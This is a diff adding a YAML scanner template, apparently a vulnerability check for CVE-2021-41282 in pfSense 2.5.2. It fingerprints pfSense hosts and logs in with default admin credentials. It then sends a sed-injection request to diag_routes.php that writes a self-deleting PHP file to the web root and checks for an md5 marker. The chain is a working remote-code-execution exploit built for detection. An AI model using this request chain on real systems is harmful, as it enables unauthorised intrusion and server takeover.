@@ -1,0 +1,44 @@
+name: pfSense_Arbitrary_File_Write_to_RCE
+transport: http
+set: {}
+detail:
+  dock: (banner="pfSense " && protocol="snmp") || body="https://www.pfsense.org/?gui=bootstrap"
+    || body="Rubicon Communications, LLC (Netgate)" || body="<h4>Login to pfSense</h4>"
+    ||(body="<title id=\"pfsense-logo-svg\">pfSense Logo</title>" && body="CsrfMagic.end")
+  product: pfsense
+  homepage: www.pfsense.org
+  impact: <p>Attackers can use this vulnerability to arbitrarily execute code on the
+    server side, write backdoors, obtain server permissions, and then control the
+    entire web server.<br></p>
+  description: <p>diag_routes.php in pfSense 2.5.2 allows sed data injection. The
+    data is retrieved by executing the netstat utility, and then its output is parsed
+    via the sed utility.<br></p>
+rules:
+  r1:
+    method: GET
+    path: /index.php
+    follow_redirects: false
+    output:
+      search_csrfToken: r'(?P<csrfToken>sid:[a-z0-9,;:]+)'.bsubmatch(response.body)
+      var_csrfToken: search_csrfToken['csrfToken']
+    expression: response.status == 200
+  r2:
+    method: POST
+    path: /index.php
+    follow_redirects: false
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: __csrf_magic={{var_csrfToken}}&usernamefld=admin&passwordfld=pfsense&login=Sign+In
+    expression: 'response.status == 302 && response.raw_header.bcontains(b''Location:
+      /'')'
+  r3:
+    method: GET
+    path: /diag_routes.php?isAjax=1&filter=.*/!d;};s/Destination/\x3c\x3fphp+var_dump(md5(\x27CVE-2021-41282\x27));unlink(__FILE__)\x3b\x3f\x3e/;w+/usr/local/www/test.php%0a%23
+    follow_redirects: false
+    expression: response.status == 200
+  r4:
+    method: GET
+    path: /test.php
+    follow_redirects: false
+    expression: response.status == 200 && response.body.bcontains(b'c3959e8a43f1b39b0d1255961685a238')
+expression: r1() && r2() && r3() && r4()
